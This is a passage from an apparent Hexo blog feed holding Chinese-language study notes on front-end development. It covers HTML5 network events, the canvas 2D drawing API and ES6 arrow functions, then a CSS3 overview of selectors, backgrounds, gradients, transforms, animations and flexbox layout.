&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure><h3 id="网络监听的事件"><a href="#网络监听的事件" class="headerlink" title="网络监听的事件"></a>网络监听的事件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="comment">// 网络监听的事件</span></span><br><span class="line">  <span class="comment">// 10 online 在线 offline 离线</span></span><br><span class="line">  <span class="comment">// 事件是给window绑订的</span></span><br><span class="line">  <span class="comment">// 通过window.navigator.onLine可以返回当前的网络状态</span></span><br><span class="line">  <span class="built_in">window</span>.addEventListener(<span class="string">'online'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//alert('online');</span></span><br><span class="line">    $(<span class="string">'.tips'</span>).text(<span class="string">'网络已连接'</span>).fadeIn(<span class="number">500</span>).delay(<span class="number">1000</span>).fadeOut();</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="built_in">window</span>.addEventListener(<span class="string">'offline'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//alert('offline');</span></span><br><span class="line">    $(<span class="string">'.tips'</span>).text(<span class="string">'网络已断开'</span>).fadeIn(<span class="number">500</span>).delay(<span class="number">1000</span>).fadeOut();</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="canvas"><a href="#canvas" class="headerlink" title="canvas"></a>canvas</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>使用 canvas 绘图</p><ul><li>一定要有一个 canvas 标签. canvas 标签不能够绘图, 它只是画布, 但是它可以获得绘图工具对象.</li><li>绘图工具对象提供了各种绘图的 api( 函数, 方法 ), 需要绘制什么形状的时候就调用什么方法即可.</li></ul><p>获得绘图工具对象 <code>canvas.getContext(&#39;2d&#39;);</code> // ‘webgl’</p><p>具体如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;canvas width=<span class="string">"600"</span> height=<span class="string">"300"</span>&gt;</span><br><span class="line">  你好, 您的浏览器不支持 Canvas, 请升级....</span><br><span class="line">&lt;<span class="regexp">/canvas&gt;</span></span><br><span class="line"><span class="regexp">var cases = document.getElementsByTagName('canvas');</span></span><br><span class="line"><span class="regexp">var context = cases[0].getContext("2d");</span></span><br></pre></td></tr></table></figure><h3 id="canvas-getContext-的-API"><a href="#canvas-getContext-的-API" class="headerlink" title="canvas.getContext 的 API"></a>canvas.getContext 的 API</h3><p>状态：凡是涉及到 颜色, 线宽, 虚线, 线帽, 拐点, 描边, 填充 等等都是绘图时的状态.</p><p><code>context.beginPath();</code> // 开启一个新的路径</p><p>实际上, 开始绘图的时候:</p><ul><li>系统就默认的有一个 beginPath 行为</li><li>如果一个阶段绘制结束了, 需要开启一个新的 beginPath</li><li>接着绘制另一个阶段的图像.这个阶段就是状态.</li><li>这个状态就是指:线宽, 颜色, 端点状态, 线状态, 描边还是填充</li></ul><p>在开启新路径时, 绘制工具的状态数据会被继承下来,即前面设置的状态会被后面保留, 如果需要启用原来的状态有两个方法</p><ul><li>手动设置状态</li><li>存储恢复状态</li></ul><p>使用场景:</p><ul><li>如果绘制了一个图形, 但是临时要绘制另一个图形</li><li><p>在绘制完这个图形后, 还需要回到原来的状态中继续绘制</p></li><li><p><code>context.moveTo( x, y );</code></p><ul><li>告诉计算机从什么地方开始绘制 </li></ul></li><li><code>context.lineTo( x, y );</code><ul><li>告诉计算机从当前位置描点到哪里</li></ul></li><li><code>context.stroke();</code><ul><li>描边，将前面描点用线依次连接起来</li></ul></li><li><code>context.fill();</code><ul><li>填充 如果描点的曲线不闭合,那么将自动将起点与终点连接起来填充</li></ul></li><li><code>context.lineWidth = 数字;</code><ul><li>设置线宽</li></ul></li><li><code>context.strokeStyle = 表示颜色的字符串;</code><ul><li>描边颜色</li></ul></li><li><code>context.fillStyle = 表示颜色的字符串;</code><ul><li>填充颜色</li></ul></li><li><code>context.font = &#39;50px 黑体&#39;;</code><ul><li>设置字体</li></ul></li><li><code>context.setLineDash(数组);</code><ul><li>绘制虚线</li></ul></li></ul><p>数组是描述实部与虚部的长度.</p><ul><li>为[]时表示绘制实线;</li><li>[value1,value2]表示虚线的实部和虚部;</li><li>[val1,val2,val3,…]表示虚线的实部和虚部交替取值，取完之后再循环取值。</li><li><code>context.save();</code><ul><li>保存当前状态,那么后面可以对状态做任何修改</li></ul></li><li><code>context.restore();</code><ul><li>在想要回到原来的状态时, 调用此方法</li></ul></li><li><code>context.closePath();</code><ul><li>如果是绘制闭合的曲线, 那么最后可以使用<ul><li>如果绘制的折线, 那么两条线段之间会自动补全尖角</li><li>如果不是连续的折线, 那么闭合的两条线段, 是不会补全尖角</li></ul></li></ul></li><li>应用：可以利用x，y的坐标的数学函数的关系来绘制各种曲线</li><li><code>context.strokeRect(x坐标,y坐标,宽,高);</code><ul><li>描边矩形</li></ul></li><li><code>context.fillRect(x坐标,y坐标,宽,高);</code><ul><li>填充矩形</li></ul></li><li><code>context.clearRect(x坐标,y坐标,宽,高);</code><ul><li>擦除矩形区 应用：做动画</li></ul></li><li><code>context.arc(x坐标,y坐标,半径,起始角,终点角度);</code><ul><li>角度是弧度制</li></ul></li><li><code>context.strokeText(&#39;测试文字&#39;,100,100 );</code><ul><li>描边文本</li></ul></li><li><code>context.fillText(&#39;测试文字&#39;,300,100);</code><ul><li>填充文本</li></ul></li><li>绘图第一种用法,将整个图片按照本身的宽高绘制到绘布上<ul><li><code>context.drawImage(img,x轴坐标,y轴坐标);</code></li></ul></li><li>绘图第二种用法, 将图绘制在指定的矩形区域内<ul><li><code>var img = document.createElement( &#39;img&#39; );</code></li></ul></li><li>绘图时首先需要准备图片<ul><li>img.src = ‘1.jpg’;</li></ul></li><li><code>context.drawImage(img,x轴坐标,y轴坐标,宽,高);</code><ul><li>第三种绘制图片的方法，绘制精灵图(结合setInterval();方法做一些动画)</li></ul></li><li><code>context.drawImage(图片,截取精灵图的x,截取精灵图的y,截取宽度w,截取高度度h,放在画布上的x坐标,放在画布上的y坐标,图片所占画布的宽,图片所占画布的高);</code></li><li><code>context.translate(x,y);</code><ul><li>坐标平移变换</li></ul></li><li><code>context.rotate(弧度);</code><ul><li>坐标旋转变换，最简单应用：旋转的正方形</li></ul></li><li><code>context.scale(x,y);</code><ul><li>左边伸缩变换(x或y缩放的倍数,如果是1表示不缩放)最简单应用一：椭圆</li></ul></li></ul><p>注：变换是可以累加的</p><h3 id="非零环绕原则"><a href="#非零环绕原则" class="headerlink" title="非零环绕原则"></a>非零环绕原则</h3><p>在 canvas 绘图中是使用路径描线的方法绘制图形</p><p>描点时的顺序有一定的作用, 在描点时围绕起来的图形满足 “非零环绕原则” 的区域就会被镂空起来如果不满足就会被填充.</p><ul><li>计算的值为 0 就 镂空, 如果非零就是填充</li><li>从图形的内部拉一个箭头, 以箭头的起点为圆心</li><li>检查穿过箭头的线, 以箭头起点为圆心如果顺时针记为 +1</li><li>如果逆时针记为 -1, 最后求和, 如果为 0 则镂空, 如果非零 则填充</li></ul><h3 id="圆上坐标的计算公式"><a href="#圆上坐标的计算公式" class="headerlink" title="圆上坐标的计算公式"></a>圆上坐标的计算公式</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = x0 + r * <span class="built_in">Math</span>.cos( 弧度 );</span><br><span class="line">y = y0 + r * <span class="built_in">Math</span>.sin( 弧度 );</span><br></pre></td></tr></table></figure><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><ul><li>ES5 中对数组做了扩展, 引入了 forEach 和 map 等方法</li><li>ES6 中引入了 箭头函数 arrow function 简化函数的书写( 还有其他特征 )<ul><li>函数不写 function</li><li>参数如果只有一个 不写圆括号</li><li>参数与函数体用 =&gt; 连接</li><li>函数体如果只有一句话可以省略花括号</li><li>如果函数体只有一句话, 且返回数据, 可以省略 return</li></ul></li></ul><p>如：<code>var maxX = Math.max.apply( null, points.map(function (v) { return v.x; }));</code></p><p>简写成：<code>var maxX = Math.max.apply( null, points.map(v=&gt;v.x) );</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;简介、h5语义化标签、经典布局&quot;&gt;&lt;a href=&quot;#简介、h5语义化标签、经典布局&quot; class=&quot;headerlink&quot; title=&quot;简介、h5语义化标签、经典布局&quot;&gt;&lt;/a&gt;简介、h5语义化标签、经典布局&lt;/h2&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;!--[&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; lt IE &lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script src=&lt;span class=&quot;string&quot;&gt;&quot;js/html5shiv.min.js&quot;&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;![endif]--&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;html骨架&lt;/li&gt;
&lt;li&gt;经典网页布局&lt;/li&gt;
&lt;li&gt;语义化标签 header、nav、main、session、article、aside、figure、footer、mark、progress、hgroup(已废弃)、time、details、bdi、command、summary、rp、rt、ruby&lt;/li&gt;
&lt;li&gt;兼容h5标签的插件 html5shiv.min.js&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="HTML5系列" scheme="http://yoursite.com/categories/HTML5%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="HTML5" scheme="http://yoursite.com/tags/HTML5/"/>
    
  </entry>
  
  <entry>
    <title>CSS3知识体系</title>
    <link href="http://yoursite.com/2016/01/01/CSS3%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB/"/>
    <id>http://yoursite.com/2016/01/01/CSS3知识体系/</id>
    <published>2015-12-31T16:00:00.000Z</published>
    <updated>2018-06-01T08:44:28.449Z</updated>
    
    <content type="html"><![CDATA[<h2 id="私有前缀"><a href="#私有前缀" class="headerlink" title="私有前缀"></a>私有前缀</h2><blockquote><p>在pc端开发的时候 使用css3属性 最好加上私有前缀</p></blockquote><ul><li><code>-webkit-border-radius: 50%;</code><ul><li>谷歌</li></ul></li><li><code>-moz-border-radius: 50%;</code><ul><li>火狐</li></ul></li><li><code>-o-border-radius: 50%;</code><ul><li>欧鹏</li></ul></li><li><code>-ms-border-radius:50%;</code><ul><li>IE</li></ul></li></ul><a id="more"></a><h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><h3 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h3><ul><li><code>[attribute]</code><ul><li>选择到所有包含 attribute 这个属性的元素</li></ul></li><li><code>[attribute=value]</code><ul><li>选择到所有包含 attribute 这个属性的元素 并且属性值 只能等于value</li></ul></li><li><code>[attribute!=value]</code><ul><li>jquery才有，css 是没有这个选择器 选择到所有包含 attribute 这个属性的元素 并且属性值 只能不等于value</li></ul></li><li><code>[attribute^=value]</code> <ul><li>选择到所有包含 attribute 这个属性的元素 并且属性值 以value开头</li></ul></li><li><code>[attribute$=value]</code><ul><li>选择到所有包含 attribute 这个属性的元素 并且属性值 以value结尾</li></ul></li><li><code>[attribute*=value]</code><ul><li>选择到所有包含 attribute 这个属性的元素 并且属性值 包含value这个字符</li></ul></li><li><code>[attribute1][attribute2]</code></li></ul><h3 id="伪类选择器"><a href="#伪类选择器" class="headerlink" title="伪类选择器"></a>伪类选择器</h3><h4 id="序伪类选择器"><a href="#序伪类选择器" class="headerlink" title="序伪类选择器"></a>序伪类选择器</h4><ul><li><code>E:first-child</code><ul><li>以E为子元素 确定父级元素 找它的第一个子元素 并且还要是E</li></ul></li><li><code>E:last-child</code><ul><li>以E为子元素 确定父级元素 找它的最后一个子元素 并且还要是E</li></ul></li><li><code>E:nth-child(n)</code><ul><li>以E为子元素 确定父级元素 找它的第n个子元素 并且还要是E(有效 1-无穷)<ul><li>n遵循线性变化，其取值0、1、2、3、4、… 但是当n&lt;=0时，选取无效。</li><li>n可是多种形式：nth-child(2n)、nth-child(2n+1)、nth-child(-1n+5)等;</li><li>n注意:位置的关系(n一定要放在表达式的前面)</li></ul></li></ul></li><li><code>:empty</code> 元素为空时选中</li><li><code>:target</code> 目标伪类选择器，它选中的当前锚点</li></ul><h4 id="伪元素选择器"><a href="#伪元素选择器" class="headerlink" title="伪元素选择器"></a>伪元素选择器</h4><ul><li><code>:not([name=&quot;special&quot;])</code><ul><li>不包含该属性的选中</li></ul></li><li><code>::before ::after</code><ul><li>伪元素选择器 (知识重点)</li></ul></li><li><code>::first-letter</code> <ul><li>首个文字的选着器 必须是一个块级元素</li></ul></li><li><code>::first-line</code><ul><li>首行</li></ul></li><li><code>::selection</code><ul><li>文本选择中的变样式：背景色，颜色等</li></ul></li></ul><h2 id="颜色"><a href="#颜色" class="headerlink" title="颜色"></a>颜色</h2><h3 id="opacity"><a href="#opacity" class="headerlink" title="opacity"></a>opacity</h3><p>只能针对整个盒子设置透明度，子盒子及内容会继承父盒子的透明度</p><h3 id="transparent"><a href="#transparent" class="headerlink" title="transparent"></a>transparent</h3><p>只能针对整个盒子设置透明度，子盒子及内容会继承父盒子的透明度</p><h3 id="rgba-0-0-0-0-5"><a href="#rgba-0-0-0-0-5" class="headerlink" title="rgba(0,0,0,0.5);"></a>rgba(0,0,0,0.5);</h3><p>Red、Green、Blue、Alpha</p><h3 id="hsla-240-100-40-0-6"><a href="#hsla-240-100-40-0-6" class="headerlink" title="hsla(240, 100%, 40%, 0.6);"></a>hsla(240, 100%, 40%, 0.6);</h3><p>通过hsla我们可以对颜色的透明度进行控制, （色调，饱和度，亮度，透明度）</p><h2 id="文本阴影-text-shadow"><a href="#文本阴影-text-shadow" class="headerlink" title="文本阴影 text-shadow"></a>文本阴影 text-shadow</h2><p><code>text-shadow:3px 3px 5px #000,-6px -6px 5px red;</code></p><ul><li>第一个参数 x轴的偏移量</li><li>第二个参数 y轴的偏移量</li><li>第三个参数 阴影的长度</li><li>第四个参数 阴影的颜色</li></ul><h2 id="盒模型"><a href="#盒模型" class="headerlink" title="盒模型"></a>盒模型</h2><p>百分比宽度的时候怎么防止溢出</p><p>CSS3中可以通过box-sizing 来指定盒模型，即可指定为content-box、border-box，这样我们计算盒子大小的方式就发生了改变。</p><p>可以分成两种情况：</p><ol><li>box-sizing: border-box<ul><li>计算方式为 width = border + padding + content</li></ul></li><li>box-sizing: content-box<ul><li>计算方式为 width = content</li></ul></li></ol><p>兼容性比较好</p><p><code>display:block;</code> 解决图片下间隙</p><h2 id="边框"><a href="#边框" class="headerlink" title="边框"></a>边框</h2><h3 id="边框圆角-border-radius"><a href="#边框圆角-border-radius" class="headerlink" title="边框圆角 border-radius"></a>边框圆角 <code>border-radius</code></h3><ul><li><code>border-radius: 50px 10px 50px 10px;</code></li><li><code>border-radius: 100px 100px 100px 100px / 100px 100px 100px 100px;</code></li></ul><h3 id="边框阴影-box-shadow"><a href="#边框阴影-box-shadow" class="headerlink" title="边框阴影 box-shadow"></a>边框阴影 <code>box-shadow</code></h3><ul><li><code>box-shadow: -3px -3px 2px red inset,3px 3px 2px #ccc;</code></li><li>水平偏移量 正值向右 负值向左；</li><li>垂直偏移量 正值向下 负值向上；</li><li>模糊度是不能为负值；(如果有五个属性 第四个属性是阴影的延伸)</li><li>inset可以设置内阴影；<ul><li>设置边框阴影不会改变盒子的大小，即不会影响其兄弟元素的布局。</li><li>可以设置多重边框阴影，实现更好的效果，增强立体感</li></ul></li></ul><h3 id="边框图片-border-image"><a href="#边框图片-border-image" class="headerlink" title="边框图片 border-image"></a>边框图片 <code>border-image</code></h3><p>切割的尺寸是不带单位 默认的单位是 <code>px</code></p><ul><li><code>border-image: url(&quot;./images/border.png&quot;) 27/20px round;</code><ul><li><code>border-image-source: url(&quot;./images/border_image_2.png&quot;);</code><ul><li>边框图片资源</li></ul></li><li><code>border-image-slice: 33;</code><ul><li>边框图片切割的尺寸</li></ul></li><li><code>border-image-width: 20px;</code><ul><li>边框图片宽度 自适应显示图片内容</li></ul></li><li><code>border-image-repeat: round;</code><ul><li>边框图片平铺方式 round 环绕的形式 repeat 平铺 以中心位置向两侧平铺 默认stretch 拉伸</li></ul></li></ul></li></ul><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h3 id="背景-尺寸-background-size"><a href="#背景-尺寸-background-size" class="headerlink" title="背景-尺寸 background-size"></a>背景-尺寸 <code>background-size</code></h3><ul><li><code>background-size: 600px 400px;</code><ul><li>宽和高</li></ul></li><li><code>background-size: 100% auto;</code><ul><li>是基于容器的宽度和高度来计算 不是本身</li></ul></li><li><code>background-size: auto 100%;</code><ul><li>等比例缩放</li></ul></li><li><code>background-size: contain;</code><ul><li>让背景图 完全显示在盒子里头</li></ul></li><li><code>background-size: cover;</code><ul><li>让背景图 完全铺满整个盒子</li></ul></li></ul><h3 id="背景-原点-background-origin"><a href="#背景-原点-background-origin" class="headerlink" title="背景-原点 background-origin"></a>背景-原点 <code>background-origin</code></h3><ul><li><code>background-origin: padding-box;</code><ul><li>背景原点位置 默认是从内边距开始</li></ul></li><li><code>background-origin: content-box;</code><ul><li>背景原点位置 默认是从内容开始</li></ul></li><li><code>background-origin: border-box;</code><ul><li>背景原点位置 默认是从边框开始</li></ul></li></ul><h3 id="背景-裁剪-background-clip"><a href="#背景-裁剪-background-clip" class="headerlink" title="背景-裁剪 background-clip"></a>背景-裁剪 <code>background-clip</code></h3><ul><li><code>background-clip:border-box;</code><ul><li>背景图的裁剪 默认的裁剪的位置 border-box</li></ul></li><li><code>background-clip: padding-box;</code><ul><li>背景图的裁剪 除了边距内的背景 裁剪掉了</li></ul></li><li><code>background-clip: content-box;</code><ul><li>背景图的裁剪 除了内容内的背景 裁剪掉了</li></ul></li></ul><h3 id="背景-多背景（以逗号分隔可以设置多背景，可用于自适应局）"><a href="#背景-多背景（以逗号分隔可以设置多背景，可用于自适应局）" class="headerlink" title="背景-多背景（以逗号分隔可以设置多背景，可用于自适应局）"></a>背景-多背景（以逗号分隔可以设置多背景，可用于自适应局）</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">background:</span><br><span class="line">    url(<span class="string">"images/bg1.png"</span>) left top no-repeat,</span><br><span class="line">    url(<span class="string">"images/bg2.png"</span>) right top no-repeat,</span><br><span class="line">    url(<span class="string">"images/bg3.png"</span>) right bottom no-repeat,</span><br><span class="line">    url(<span class="string">"images/bg4.png"</span>) left bottom no-repeat,</span><br><span class="line">    url(<span class="string">"images/bg5.png"</span>) repeat；</span><br></pre></td></tr></table></figure><h2 id="渐变"><a href="#渐变" class="headerlink" title="渐变"></a>渐变</h2><h3 id="线性渐变（指沿着某条直线朝一个方向产生渐变效果）"><a href="#线性渐变（指沿着某条直线朝一个方向产生渐变效果）" class="headerlink" title="线性渐变（指沿着某条直线朝一个方向产生渐变效果）"></a>线性渐变（指沿着某条直线朝一个方向产生渐变效果）</h3><ul><li><code>background-image: linear-gradient(to right,yellow,blue);</code></li><li><code>background-image: linear-gradient(90deg,transparent,black);</code><ul><li>0deg 从下往上 顺时针是正的</li><li>0% - 50% 宽度内的渐变 百分比设置多个渐变的区间</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">background-image: linear-gradient(<span class="number">45</span>deg,</span><br><span class="line">  yellow <span class="number">0</span>% ,</span><br><span class="line">  yellow <span class="number">25</span>%,</span><br><span class="line">  blue <span class="number">25</span>%,</span><br><span class="line">  blue <span class="number">50</span>%,</span><br><span class="line">  yellow <span class="number">50</span>%,</span><br><span class="line">  yellow <span class="number">75</span>%,</span><br><span class="line">  blue <span class="number">75</span>% ,</span><br><span class="line">  blue <span class="number">100</span>%</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="径向渐变（从一个中心点开始沿着四周产生渐变效果）"><a href="#径向渐变（从一个中心点开始沿着四周产生渐变效果）" class="headerlink" title="径向渐变（从一个中心点开始沿着四周产生渐变效果）"></a>径向渐变（从一个中心点开始沿着四周产生渐变效果）</h3><p>1.放射半径;2.中心圆点;3.起始颜色;4.结束颜色</p><ul><li><code>radial-gradient(150px at 80px 80px,yellow,blue);</code></li></ul><h2 id="过渡-transition"><a href="#过渡-transition" class="headerlink" title="过渡 transition"></a>过渡 <code>transition</code></h2><p><code>transition: all 1s linear 1s;</code></p><ul><li>transition-property: all;<ul><li>需要产生过渡的属性 all所有的</li></ul></li><li>transition-duration: 1s;<ul><li>完成一个状态到另一个状态的过渡时间</li></ul></li><li>transition-timing-function: linear;<ul><li>过渡的 速度 匀速 先快后慢 先慢后快</li></ul></li><li>transition-delay: 1s;<ul><li>过渡延时</li></ul></li><li>backface-visibility<ul><li>设置元素背景是否可见</li></ul></li></ul><h2 id="2D转换"><a href="#2D转换" class="headerlink" title="2D转换"></a>2D转换</h2><h3 id="缩放"><a href="#缩放" class="headerlink" title="缩放"></a>缩放</h3><ul><li><code>transform: scale(2, 2);</code><ul><li>x轴方向的缩放比,y轴方向的缩放比</li></ul></li></ul><h3 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h3><ul><li><code>transform: translate(10%,0px);</code><ul><li>x轴方向的移动,y轴方向的移动,百分比 基于他本身的</li></ul></li></ul><h3 id="旋转"><a href="#旋转" class="headerlink" title="旋转"></a>旋转</h3><ul><li><code>transform: rotate(-90deg);</code><ul><li>如果是正值,是顺时针旋转;如果是负值 ,是逆时针旋转</li></ul></li></ul><h3 id="旋转原点"><a href="#旋转原点" class="headerlink" title="旋转原点"></a>旋转原点</h3><ul><li><code>transform-origin: left center;</code></li></ul><h3 id="倾斜"><a href="#倾斜" class="headerlink" title="倾斜"></a>倾斜</h3><ul><li><code>transform: skew(45deg,0deg);</code><ul><li>x轴 正值是逆时针 y轴正值是顺时针</li></ul></li></ul><h2 id="3D转换"><a href="#3D转换" class="headerlink" title="3D转换"></a>3D转换</h2><ul><li><code>rotateX(180deg);</code><ul><li>如果是负的 就是顺时针 正的是逆时针</li></ul></li><li><code>perspective: 100px;</code><ul><li>透视</li></ul></li><li><code>transform-style: preserve-3d;</code><ul><li>透视</li></ul></li></ul><h2 id="CSS3-动画"><a href="#CSS3-动画" class="headerlink" title="CSS3 动画"></a>CSS3 动画</h2><ul><li>声明 @keyframes 关键字 动画序列的名称 ｛｝</li><li>keyframes move{节点}</li><li>from 0% to 100% 还可以通过百分比来设置节点</li><li><code>animation-name: move;</code><ul><li>动画序列的名称</li></ul></li><li><code>animation-duration: 2s;</code><ul><li>动画执行的总时间</li></ul></li><li><code>animation-timing-function: ease;</code><ul><li>动画执行的速度 ease linear ease-in ease-in-out ease-out</li></ul></li><li><code>animation-delay: 1s;</code><ul><li>动画延时</li></ul></li><li><code>animation-fill-mode: forwards;</code><ul><li>动画结束的时候的状态 forwards 保持结束状态 backwards 回答最原生的状态 没有动画的那个状态</li></ul></li><li><code>animation-iteration-count: infinite;</code><ul><li>动画执行的次数 次数 特殊的值 infinite 执行无数次</li></ul></li><li><code>animation-direction:alternate;</code><ul><li>动画逆播放</li></ul></li><li><code>animation-play-state:paused;</code><ul><li>执行的状态 是执行中 暂停 running、paused</li><li>分步执行 steps(3)</li></ul></li></ul><h2 id="多列布局"><a href="#多列布局" class="headerlink" title="多列布局"></a>多列布局</h2><blockquote><p>box-sizing: border-box;</p></blockquote><ul><li><code>-webkit-column-count: 4;</code><ul><li>指定列数</li></ul></li><li><code>-webkit-column-width: 400px;</code><ul><li>指定列宽</li></ul></li><li><code>-webkit-column-rule: 2px dashed #CCC;</code><ul><li>定义边框线 和 border一样</li></ul></li><li><code>-webkit-column-gap: 50px;</code><ul><li>调整列间距</li></ul></li></ul><h2 id="伸缩布局"><a href="#伸缩布局" class="headerlink" title="伸缩布局"></a>伸缩布局</h2><blockquote><p>display: flex; flex-direction: column;</p></blockquote><h3 id="flex-direction："><a href="#flex-direction：" class="headerlink" title="flex-direction："></a><code>flex-direction：</code></h3><ul><li><code>row</code></li><li><code>column</code></li><li><code>row-reverse</code></li><li><code>column-reverse</code></li><li>调整主轴方向（默认水平）</li></ul><h3 id="justify-content："><a href="#justify-content：" class="headerlink" title="justify-content："></a><code>justify-content：</code></h3><ul><li><code>flex-start</code>（起始点对齐）</li><li><code>flex-end</code>（终止点对齐）</li><li><code>center</code>（居中对齐）</li><li><code>space-around</code>（四周环绕）</li><li><code>space-between</code>（两端对齐）</li><li>(调整主轴对齐)</li></ul><h3 id="align-items：-调整测轴对齐"><a href="#align-items：-调整测轴对齐" class="headerlink" title="align-items：(调整测轴对齐)"></a><code>align-items：(调整测轴对齐)</code></h3><ul><li><code>flex-start</code>（侧轴起始点对齐）</li><li><code>flex-end</code>（侧轴终止点对齐）</li><li><code>center</code>（侧轴居中对齐）</li><li><code>stretch</code>（拉伸）</li></ul><h3 id="flex-wrap：-控制是否换行"><a href="#flex-wrap：-控制是否换行" class="headerlink" title="flex-wrap：(控制是否换行)"></a><code>flex-wrap：(控制是否换行)</code></h3><ul><li><code>wrap</code>（自动换行）</li><li><code>nowrap</code>（不自动换行）</li></ul><h3 id="align-content：-堆栈（由flex-wrap产生的独立行）对齐"><a href="#align-content：-堆栈（由flex-wrap产生的独立行）对齐" class="headerlink" title="align-content：(堆栈（由flex-wrap产生的独立行）对齐)"></a><code>align-content：(堆栈（由flex-wrap产生的独立行）对齐)</code></h3><ul><li><code>flex-start</code>（起始点对齐）</li><li><code>flex-end</code>（终止点对齐）</li><li><code>center</code>（居中对齐）</li><li><code>space-around</code>（四周环绕）</li><li><code>space-between</code>（两端对齐）</li><li><code>stretch</code>（拉伸）</li></ul><h3 id="flex-flow："><a href="#flex-flow：" class="headerlink" title="flex-flow："></a>flex-flow：</h3><ul><li><code>flex-flow</code> 是 <code>flex-direction</code> 和 <code>flex-wrap</code> 的简写形式</li></ul><h3 id="flex-控制子元素伸缩比例"><a href="#flex-控制子元素伸缩比例" class="headerlink" title="flex 控制子元素伸缩比例"></a><code>flex</code> 控制子元素伸缩比例</h3><h3 id="align-self"><a href="#align-self" class="headerlink" title="align-self"></a><code>align-self</code></h3><p>同 <code>align-items</code> 可覆盖父元素设置的 <code>algin-items</code>，包括 <code>flex-start</code>、<code>flex-end</code>、<code>center</code>、<code>stretch</code></p><h3 id="order-控制子元素的顺序"><a href="#order-控制子元素的顺序" class="headerlink" title="order 控制子元素的顺序"></a><code>order</code> 控制子元素的顺序</h3><h2 id="web字体-28"><a href="#web字体-28" class="headerlink" title="web字体(28)"></a>web字体(28)</h2><ol><li>申明 自定义的字体</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@font-face &#123;</span><br><span class="line">  <span class="comment">/*字体的名称 自定义*/</span></span><br><span class="line">  font-family: <span class="string">'itcast-font'</span>;</span><br><span class="line">  <span class="comment">/*引入字体文件  格式都市固定的  */</span></span><br><span class="line">  src:</span><br><span class="line">    url(<span class="string">"../fonts/LiDeBiao-Xing3/LiDeBiao-Xing3.svg"</span>) format(<span class="string">"svg"</span>),</span><br><span class="line">    url(<span class="string">"../fonts/LiDeBiao-Xing3/LiDeBiao-Xing3.ttf"</span>) format(<span class="string">"truetype"</span>),</span><br><span class="line">    url(<span class="string">"../fonts/LiDeBiao-Xing3/LiDeBiao-Xing3.woff"</span>) format(<span class="string">"woff"</span>),</span><br><span class="line">    url(<span class="string">"../fonts/LiDeBiao-Xing3/LiDeBiao-Xing3.eot"</span>) format(<span class="string">"embedded-opentype"</span>);</span><br><span 